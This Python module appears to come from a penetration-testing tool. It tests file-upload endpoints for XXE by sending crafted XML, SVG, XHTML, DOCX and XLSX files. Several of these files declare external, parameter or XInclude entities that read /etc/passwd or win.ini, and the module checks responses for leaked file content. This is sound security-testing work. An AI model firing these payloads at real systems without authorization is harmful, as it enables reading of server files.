"""
XXE Test – checks whether the server parses uploaded XML files and resolves
XML entities (making it potentially vulnerable to XXE attacks).

Uploads XML-based files (XML, SVG, XHTML, DOCX, XLSX) containing entity
declarations and checks whether the server expanded them — either by
reflecting entity content in the upload response, or by storing a
processed version of the file.

Contains:
- Xxe class for performing the XXE test.
- run() function as an entry point for running the test.

Usage:
    run(args, ptjsonlib, http_client, print_lock)
"""

import io
import zipfile

from ptlibs.ptprinthelper import out_if

__TESTLABEL__ = "XXE Test:"

XXE_MARKER = "PTUPLOADER_XXE_OK"

# Strings that indicate successful file read
PASSWD_INDICATORS = ["root:x:0", "/bin/bash", "/bin/sh", "daemon:", "nobody:"]
WIN_INI_INDICATORS = ["[fonts]", "[extensions]", "[Mail]"]

# ---------------------------------------------------------------------------
# Payload builders
# ---------------------------------------------------------------------------

def _xml_internal() -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n  <!ENTITY xxe "{XXE_MARKER}">\n]>\n'
        f'<root>&xxe;</root>'
    ).encode()


def _xml_external(uri: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "{uri}">\n]>\n'
        f'<root>&xxe;</root>'
    ).encode()


def _xml_parameter(uri: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [\n'
        f'  <!ENTITY % xxe SYSTEM "{uri}">\n'
        f'  %xxe;\n'
        f']>\n'
        f'<root>test</root>'
    ).encode()


def _xml_xinclude(uri: str) -> bytes:
    return (
        f'<root xmlns:xi="http://www.w3.org/2001/XInclude">\n'
        f'  <xi:include parse="text" href="{uri}"/>\n'
        f'</root>'
    ).encode()


def _svg_internal() -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE svg [\n  <!ENTITY xxe "{XXE_MARKER}">\n]>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
        f'  <text x="0" y="20">&xxe;</text>\n'
        f'</svg>'
    ).encode()


def _svg_external(uri: str) -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE svg [\n  <!ENTITY xxe SYSTEM "{uri}">\n]>\n'
        f'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">\n'
        f'  <text x="0" y="20">&xxe;</text>\n'
        f'</svg>'
    ).encode()


def _xhtml_internal() -> bytes:
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE html [\n  <!ENTITY xxe "{XXE_MARKER}">\n]>\n'
        f'<html xmlns="http://www.w3.org/1999/xhtml">\n'
        f'<body>&xxe;</body>\n'
        f'</html>'
    ).encode()


def _build_docx_xxe() -> bytes:
    """Minimal DOCX with XXE in document.xml."""
    ct = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/>'
        '</Relationships>'
    )
    doc = (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe "{XXE_MARKER}">]>'
        f'<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f'<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>'
        f'</w:document>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", ct)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("word/document.xml", doc)
    return buf.getvalue()


def _build_xlsx_xxe() -> bytes:
    """Minimal XLSX with XXE in sharedStrings.xml."""
    ct = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/xl/workbook.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
        '<Override PartName="/xl/sharedStrings.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="xl/workbook.xml"/>'
        '</Relationships>'
    )
    wb = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        '<sheets><sheet name="Sheet1" sheetId="1" '
        'r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
        '</sheets></workbook>'
    )
    ss = (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE foo [<!ENTITY xxe "{XXE_MARKER}">]>'
        f'<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        f'<si><t>&xxe;</t></si></sst>'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", ct)
        zf.writestr("_rels/.rels", rels)
        zf.writestr("xl/workbook.xml", wb)
        zf.writestr("xl/sharedStrings.xml", ss)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Test definitions
# (label, extension, content_type, body, indicators, raw_entity_ref, category)
#
# indicators:      list of strings — if ANY appears in response/storage the
#                  server resolved the entity.
# raw_entity_ref:  the literal entity reference in the payload (e.g. "&xxe;").
#                  If this string is STILL present alongside the indicators the
#                  file was stored raw and the entity was NOT expanded —
#                  avoids false positives for internal-entity tests where the
#                  marker appears inside the DOCTYPE declaration.
#                  Set to None for external-entity tests (indicators would
#                  never appear in the raw file).
# ---------------------------------------------------------------------------

XXE_TESTS = [
    # --- Internal entity (basic XML parsing check) ---
    ("XML internal entity",
     "xml", "application/xml",
     _xml_internal(), [XXE_MARKER], "&xxe;", "internal"),

    ("SVG internal entity",
     "svg", "image/svg+xml",
     _svg_internal(), [XXE_MARKER], "&xxe;", "internal"),

    ("XHTML internal entity",
     "xhtml", "application/xhtml+xml",
     _xhtml_internal(), [XXE_MARKER], "&xxe;", "internal"),

    # --- External file entity ---
    ("XML file:///etc/passwd",
     "xml", "application/xml",
     _xml_external("file:///etc/passwd"), PASSWD_INDICATORS, None, "external_file"),

    ("SVG file:///etc/passwd",
     "svg", "image/svg+xml",
     _svg_external("file:///etc/passwd"), PASSWD_INDICATORS, None, "external_file"),

    ("XML file:///C:/Windows/win.ini",
     "xml", "application/xml",
     _xml_external("file:///C:/Windows/win.ini"), WIN_INI_INDICATORS, None, "external_file"),

    # --- Parameter entity ---
    ("XML parameter entity (/etc/passwd)",
     "xml", "application/xml",
     _xml_parameter("file:///etc/passwd"), PASSWD_INDICATORS, None, "parameter"),

    # --- XInclude ---
    ("XInclude /etc/passwd",
     "xml", "application/xml",
     _xml_xinclude("file:///etc/passwd"), PASSWD_INDICATORS, None, "xinclude"),

    # --- Office XML ---
    ("DOCX with XXE",
     "docx",
     "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
     _build_docx_xxe(), [XXE_MARKER], "&xxe;", "office"),

    ("XLSX with XXE",
     "xlsx",
     "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
     _build_xlsx_xxe(), [XXE_MARKER], "&xxe;", "office"),
]


CATEGORY_LABELS = {
    "internal":      "Internal entity expansion:",
    "external_file": "External entity (file:):",
    "parameter":     "Parameter entity:",
    "xinclude":      "XInclude:",
    "office":        "Office XML (DOCX / XLSX):",
}


class Xxe:
    def __init__(self, args: object, ptjsonlib: object, http_client: object, print_lock: object) -> None:
        self.args        = args
        self.ptjsonlib   = ptjsonlib
        self.http_client = http_client
        self.print_lock  = print_lock
        self.param       = args.parameter or "file"

    def _get_stem(self) -> str:
        base = self.args.file or "test.txt"
        stem, _, _ = base.rpartition(".")
        return stem or base

    def _upload_accepted(self, response) -> bool:
        if response is None:
            return False
        text = response.text
        if self.args.string_yes and self.args.string_yes not in text:
            return False
        if self.args.string_no and self.args.string_no in text:
            return False
        return True

    @staticmethod
    def _check_indicators(text: str, indicators: list,
                          raw_entity_ref: str = None) -> bool:
        """Return True if any indicator appears in *text*.

        If *raw_entity_ref* is given and still present in the text the
        indicators come from the raw (unexpanded) source — return False.
        """
        if not text or not indicators:
            return False
        found = any(ind in text for ind in indicators)
        if not found:
            return False
        if raw_entity_ref and raw_entity_ref in text:
            return False          # entity was NOT expanded → false positive
        return True

    # ------------------------------------------------------------------

    def _test_xxe(self, label: str, filename: str, content_type: str,
                  body: bytes, indicators: list,
                  raw_entity_ref: str = None) -> dict:
        files = {self.param: (filename, body, content_type)}
        data = (
            dict(item.split("=", 1) for item in self.args.data.split("&"))
            if self.args.data else None
        )

        try:
            response = self.http_client.send_request(
                url=self.args.url, method="POST", files=files, data=data,
            )
        except Exception:
            return {"label": label, "filename": filename, "content_type": content_type,
                    "accepted": False, "reflected_response": False,
                    "reflected_storage": False, "error": True}

        accepted = self._upload_accepted(response)
        resp_text = response.text if response else ""

        reflected_response = self._check_indicators(
            resp_text, indicators, raw_entity_ref,
        )

        reflected_storage = False
        if accepted and self.args.storage:
            storage_url = self.args.storage.rstrip("/") + "/" + filename
            try:
                check = self.http_client.send_request(
                    url=storage_url, method="GET", allow_redirects=True,
                )
                if check and check.status_code == 200:
                    reflected_storage = self._check_indicators(
                        check.text, indicators, raw_entity_ref,
                    )
            except Exception:
                pass

        return {"label": label, "filename": filename, "content_type": content_type,
                "accepted": accepted, "reflected_response": reflected_response,
                "reflected_storage": reflected_storage, "error": False}

    # ------------------------------------------------------------------

    def _report_result(self, result: dict) -> None:
        label = result["label"]
        fname = result["filename"]

        if result["error"]:
            self.print_lock.add_string_to_output(
                out_if(f"Error  [{label}]  {fname}", "WARNING",
                       not self.args.json, indent=8)
            )
            return

        if not result["accepted"]:
            self.print_lock.add_string_to_output(
                out_if(f"Rejected  [{label}]  {fname}", "OK",
                       not self.args.json, indent=8)
            )
            return

        if result["reflected_response"]:
            self.print_lock.add_string_to_output(
                out_if(f"XXE CONFIRMED (reflected in response)  [{label}]  {fname}",
                       "VULN", not self.args.json, indent=8)
            )
            self.ptjsonlib.add_vulnerability("PTV-WEB-UPLOAD-XXE")
            return

        if result["reflected_storage"]:
            self.print_lock.add_string_to_output(
                out_if(f"XXE CONFIRMED (reflected in storage)  [{label}]  {fname}",
                       "VULN", not self.args.json, indent=8)
            )
            if self.args.storage:
                url = self.args.storage.rstrip("/") + "/" + fname
                self.print_lock.add_string_to_output(
                    out_if(url, "TEXT", not self.args.json, indent=12)
                )
            self.ptjsonlib.add_vulnerability("PTV-WEB-UPLOAD-XXE")
            return

        # Accepted but no reflection detected
        if self.args.storage:
            self.print_lock.add_string_to_output(
                out_if(f"Accepted, no entity reflection detected  [{label}]  {fname}",
                       "OK", not self.args.json, indent=8)
            )
        else:
            self.print_lock.add_string_to_output(
                out_if(f"Accepted (no storage URL to verify)  [{label}]  {fname}",
                       "WARNING", not self.args.json, indent=8)
            )

    # ------------------------------------------------------------------

    def run(self) -> None:
        self.print_lock.add_string_to_output(
            out_if(__TESTLABEL__, "INFO", not self.args.json)
        )

        stem = f"{self._get_stem()}_xxe"

        self.print_lock.add_string_to_output(
            out_if(f"Testing {len(XXE_TESTS)} XXE payloads...",
                   "INFO", not self.args.json, indent=4)
        )

        # Group by category (preserve order)
        categories_seen = []
        tests_by_cat = {}
        for label, ext, ct, body, indicators, raw_ref, category in XXE_TESTS:
            if category not in tests_by_cat:
                tests_by_cat[category] = []
                categories_seen.append(category)
            tests_by_cat[category].append((label, ext, ct, body, indicators, raw_ref))

        confirmed_count = 0
        accepted_count = 0
        total = len(XXE_TESTS)

        for category in categories_seen:
            cat_label = CATEGORY_LABELS.get(category, f"{category}:")
            self.print_lock.add_string_to_output(
                out_if(cat_label, "INFO", not self.args.json, indent=4)
            )
            for label, ext, ct, body, indicators, raw_ref in tests_by_cat[category]:
                filename = f"{stem}.{ext}"
                result = self._test_xxe(label, filename, ct, body, indicators, raw_ref)
                self._report_result(result)
                if result["accepted"]:
                    accepted_count += 1
                if result["reflected_response"] or result["reflected_storage"]:
                    confirmed_count += 1

        # Summary
        if confirmed_count > 0:
            self.print_lock.add_string_to_output(
                out_if(f"CRITICAL: XXE confirmed in {confirmed_count}/{total} payloads — server parses XML entities!",
                       "VULN", not self.args.json, indent=4)
            )
        elif accepted_count > 0:
            self.print_lock.add_string_to_output(
                out_if(f"Server accepted {accepted_count}/{total} XML files but no entity reflection detected",
                       "WARNING", not self.args.json, indent=4)
            )
        else:
            self.print_lock.add_string_to_output(
                out_if(f"Server rejected all {total} XML-based uploads",
                       "OK", not self.args.json, indent=4)
            )


def run(args, ptjsonlib, http_client, print_lock):
    """Entry point for running the XXE Test module."""
    Xxe(args, ptjsonlib, http_client, print_lock).run()
